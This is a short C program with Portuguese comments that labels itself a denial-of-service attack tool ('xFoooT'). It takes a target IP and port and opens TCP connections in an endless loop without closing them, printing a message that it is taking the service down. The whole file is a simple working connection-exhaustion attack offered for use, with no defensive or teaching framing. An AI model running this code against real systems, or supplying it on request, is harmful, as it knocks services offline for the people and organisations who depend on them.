//Programa para ataque de negação de serviço
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>

main(int argc, char *argv[]){

	int meusocket;
	int conecta;
	int porta;
	char * ip;
	
	if(argv[1] == 0 || argv[2] == 0){
		printf("Dos - xFoooT\n");
		printf("Uso padrão: %s  192.168.1.1 21\n",argv[0] );
	}else{
		ip    = argv[1];
		porta = atoi(argv[2]);

		struct sockaddr_in alvo;
		while(ip != "never"){

			meusocket = socket(AF_INET, SOCK_STREAM, 0);
			alvo.sin_family = AF_INET;
			alvo.sin_port = htons(porta);
			alvo.sin_addr.s_addr = inet_addr(ip);

			conecta = connect(meusocket, (struct sockaddr* )&alvo, sizeof alvo);

			if(conecta == 0){
				printf("Derrubando Servico\n");
			}/*else{
				close(meusocket);
				close(conecta);
			}*/
		}
	}
}

